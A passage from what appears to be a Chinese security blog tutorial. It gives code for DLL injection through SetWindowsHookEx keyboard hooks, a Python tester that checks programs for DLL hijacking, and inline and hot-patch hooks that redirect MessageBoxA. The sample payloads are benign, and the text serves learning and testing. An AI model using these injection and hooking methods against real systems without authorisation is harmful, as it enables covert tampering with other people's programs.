punctuation">&#125;</span> <span class="token comment">// 加载DLL和导出的函数</span> HMODULE dll <span class="token operator">=</span> <span class="token function">LoadLibraryExA</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> DONT_RESOLVE_DLL_REFERENCES<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dll <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open Dll failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> HOOKPROC hookProc <span class="token operator">=</span> <span class="token punctuation">(</span>HOOKPROC<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>dll<span class="token punctuation">,</span> strProcName<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hookProc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Get proc of the dll failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// Hook键盘消息</span> HHOOK hHook <span class="token operator">=</span> <span class="token function">SetWindowsHookEx</span><span class="token punctuation">(</span>WH_KEYBOARD<span class="token punctuation">,</span> hookProc<span class="token punctuation">,</span> dll<span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hHook <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Call SetWindowsHookEx failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by SetWindowsHookEx success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Press any key to unhook:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">UnhookWindowsHookEx</span><span class="token punctuation">(</span>hHook<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed to unhook\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Unhook success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">FreeLibrary</span><span class="token punctuation">(</span>dll<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-4-反射注入"><a href="#2-4-反射注入" class="headerlink" title="2.4 反射注入"></a>2.4 反射注入</h3><p>TODO</p><h2 id="3-DLL劫持"><a href="#3-DLL劫持" class="headerlink" title="3 DLL劫持"></a>3 DLL劫持</h2><p>DLL劫持是在攻防中会用到的手段，在这里只探讨关于特定程序的简单DLL劫持检测，而不是对系统存在的DLL劫持风险进行检测。<br>我参考<em><strong>DLLHSC</strong></em>项目使用Python实现了简单的DLL劫持测试，没有实现Hook LoadLibrary函数进行动态检测的部分。<br>首先从注册表中获取到系统的KnownDLLs列表，凡是在此列表中存在的DLL都是无法被劫持的。<br>然后获取到程序运行后加载的所有DLL名称(不只是导入表中的，因为导入的DLL还会导入其他DLL)，同时排除掉KnownDLLs列表中已经存在的DLL以及WinSxS目录下的DLL（因为系统会对目录下的DLL加载进行安全验证）。<br>最后将准备好的payload.dll置于程序同一目录下，这个DLL会在加载时在当前目录创建一个temp文件，然后可以通过判断是否存在此文件来验证DLL是否被加载。我们不断地重命名payload.dll为已经获取到的DLL列表中的名称，如果成功创建文件则表明存在DLL劫持；如果程序崩溃则说明payload.dll可能没有实现原先DLL中的某些功能；如果程序正常启动，则认为此DLL不存在劫持。</p><h3 id="3-1-获取DLL列表"><a href="#3-1-获取DLL列表" class="headerlink" title="3.1 获取DLL列表"></a>3.1 获取DLL列表</h3><p>使用psutil可以直接获取到进程加载的DLL。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">known_dlls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  import_dlls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  load_dlls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      def <span class="token function">get_known_dlls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>      <span class="token string">""</span>"      获取系统的KnownDlls列表      <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>      <span class="token string">""</span><span class="token string">"    access_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"</span>SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"<span class="token punctuation">)</span>      try<span class="token operator">:</span>         i <span class="token operator">=</span> <span class="token number">0</span>         <span class="token keyword">while</span> True<span class="token operator">:</span>            dll_name <span class="token operator">=</span> winreg<span class="token punctuation">.</span><span class="token function">EnumValue</span><span class="token punctuation">(</span>access_key<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">print</span><span class="token expression"><span class="token punctuation">(</span>dll_name<span class="token punctuation">)</span>  </span></span>          known_dlls<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>dll_name<span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">1</span>      except Exception as e<span class="token operator">:</span>         <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"[+] Read registry finished:"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>      finally<span class="token operator">:</span>         winreg<span class="token punctuation">.</span><span class="token function">CloseKey</span><span class="token punctuation">(</span>access_key<span class="token punctuation">)</span>      def <span class="token function">get_import_dlls</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token operator">:</span>      <span class="token string">""</span>"      显示导入表中可能被利用的DLL      <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>      <span class="token string">""</span>"    pe <span class="token operator">=</span> <span class="token function">PE</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span>      import_table <span class="token operator">=</span> pe<span class="token punctuation">.</span>DIRECTORY_ENTRY_IMPORT      <span class="token keyword">for</span> i in import_table<span class="token operator">:</span>         dll_name <span class="token operator">=</span> i<span class="token punctuation">.</span>dll<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> dll_name not in known_dlls<span class="token operator">:</span>            import_dlls<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>dll_name<span class="token punctuation">)</span>      def <span class="token function">get_load_dlls</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token operator">:</span>      <span class="token string">""</span>"      显示载入时加载的DLL      <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>      <span class="token string">""</span>"    try<span class="token operator">:</span>         proc <span class="token operator">=</span> psutil<span class="token punctuation">.</span><span class="token function">Process</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span>         <span class="token keyword">for</span> mem in proc<span class="token punctuation">.</span><span class="token function">memory_maps</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>mem<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">endswith</span><span class="token punctuation">(</span><span class="token char">'.dll'</span><span class="token punctuation">)</span> or mem<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">endswith</span><span class="token punctuation">(</span><span class="token char">'.drv'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> and <span class="token char">'WinSxS'</span> not in mem<span class="token punctuation">.</span>path<span class="token operator">:</span>               begin <span class="token operator">=</span> mem<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">rfind</span><span class="token punctuation">(</span><span class="token char">'\\'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>               dll_name <span class="token operator">=</span> mem<span class="token punctuation">.</span>path<span class="token punctuation">[</span>begin<span class="token operator">:</span><span class="token punctuation">]</span>               <span class="token keyword">if</span> dll_name not in known_dlls and dll_name not in load_dlls<span class="token operator">:</span>                  load_dlls<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>dll_name<span class="token punctuation">)</span>      except Exception as e<span class="token operator">:</span>         <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"[!] "</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-劫持测试"><a href="#3-2-劫持测试" class="headerlink" title="3.2 劫持测试"></a>3.2 劫持测试</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">def <span class="token function">test_hijack</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> dlls<span class="token punctuation">)</span><span class="token operator">:</span>      <span class="token string">""</span>"      使用恶意DLL进行劫持测试      <span class="token operator">:</span><span class="token keyword">return</span><span class="token operator">:</span>      <span class="token string">""</span>"    <span class="token keyword">for</span> dll in dlls<span class="token operator">:</span>         os<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token char">'./files/payload32.dll'</span><span class="token punctuation">,</span> <span class="token char">'./files/'</span><span class="token operator">+</span>dll<span class="token punctuation">)</span>         proc <span class="token operator">=</span> psutil<span class="token punctuation">.</span><span class="token function">Popen</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>         time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token char">'./temp_4396'</span><span class="token punctuation">)</span><span class="token operator">:</span>            <span class="token function">print</span><span class="token punctuation">(</span>f<span class="token string">"[+] &#123;dll&#125; for &#123;filename&#125; can be hijacked!"</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token char">'./temp_4396'</span><span class="token punctuation">)</span>         try<span class="token operator">:</span>            proc<span class="token punctuation">.</span><span class="token function">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         except psutil<span class="token punctuation">.</span>NoSuchProcess<span class="token operator">:</span>            <span class="token function">print</span><span class="token punctuation">(</span>f<span class="token string">"[*] &#123;dll&#125; for &#123;filename&#125; may be hijacked!"</span><span class="token punctuation">)</span>         finally<span class="token operator">:</span>            os<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token char">'./files/'</span><span class="token operator">+</span>dll<span class="token punctuation">,</span> <span class="token char">'./files/payload32.dll'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对Windows XP下的notepad.exe进行测试的结果如下：<br><img src="/images/1-1.png" alt="1-1"></p><h2 id="4-API-Hook"><a href="#4-API-Hook" class="headerlink" title="4 API Hook"></a>4 API Hook</h2><p>网上对于Hook的分类有很多，上面在DLL注入中已经介绍了消息Hook，所以在这里就只介绍Ring3中的API Hook，即对系统DLL中的API函数进行挂钩。网上也有称之为Inject Hook的，但是我感觉还是API Hook最合适。<br>访问其他进程的最简单方式就是DLL，所以Hook通常也是通过DLL注入实现的。我们在DLL中设置好Hook函数，在DLL加载时就进行挂钩，DLL卸载时进行脱钩就可以实现完整的Hook过程。<br>此部分的代码很多都参考了selph师傅的博客，只实现了32位程序的Hook。</p><h3 id="4-1-Inline-Hook"><a href="#4-1-Inline-Hook" class="headerlink" title="4.1 Inline Hook"></a>4.1 Inline Hook</h3><p>修改API函数地址的开头的机器码为JMP跳转指令，如果还需要使用原有的API函数，则需要先Unhook，调用完后再重新Hook。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>BYTE originOpcode<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC hookAddr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">;</span>BOOL WINAPI <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD  fdwReason<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span>fdwReason<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>  <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PROC<span class="token punctuation">)</span>Hook<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"InstallHook!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>  <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC hookAddr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> BYTE hookOpcode<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1. 获取API函数地址</span> PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2. 修改内存属性</span> DWORD originFlags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originFlags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3. 读取原机器码，保存</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> originOpcode<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4. 构造跳转机器码，写入</span> DWORD jmpAddr <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>hookAddr <span class="token operator">-</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>procAddr <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hookOpcode<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>jmpAddr<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> hookOpcode<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 5. 恢复内存属性</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> originFlags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">GetCurrentProcessId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1. 获取API函数地址</span> PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2. 修改内存属性</span> DWORD origin_flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>origin_flags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3. 将原来的机器码写入</span> <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> originOpcode<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4. 恢复内存属性</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> origin_flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"Hooked!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PROC<span class="token punctuation">)</span>Hook<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="HotFix"><a href="#HotFix" class="headerlink" title="HotFix"></a>HotFix</h4><p>如果想要Hook的API函数的地址前有至少5字节空闲区域可以被利用，则可以在其地址前的5个字节构造JMP指令，在函数地址处构造机器码0xEB, 0xF9跳转到-7字节，即函数前5字节JMP指令，那么正常的API调用就会跳转到JMP指令上。如果我们需要使用原有的API函数，只需要调用函数地址+2就可以了。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>BYTE originOpcode<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC hookAddr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> WINAPI <span class="token function">Hook</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span class="token punctuation">;</span>BOOL WINAPI <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD  fdwReason<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span>fdwReason<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>  <span class="token function">InstallHook</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PROC<span class="token punctuation">)</span>Hook<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">"InstallHook!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>  <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">InstallHook</span><span class="token punctuation">(</span>PROC hookAddr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> BYTE hookOpcode<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xF9</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1. 获取API函数地址, 计算Hook的起始地址</span> PROC procAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MessageBoxA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> PBYTE beginAddr <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>procAddr <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// 2. 读取原来的机器码</span> DWORD originFlags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>originFlags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> originOpcode<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> DWORD jmpAddr <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>hookAddr <span class="token operator">-</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>procAddr<span class="token punctuation">;</span> <span class="token comment">// 此处加5减5正好抵消了</span> <span class="token comment">// 3. 构造跳转机器码，写入</span> <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hookOpcode<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>jmpAddr<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> beginAddr<span class="token punctuation">,</span> hookOpcode<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">VirtualProtectEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> procAddr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> originFlags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">UninstallHook</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> PROC procAddr <span class="token 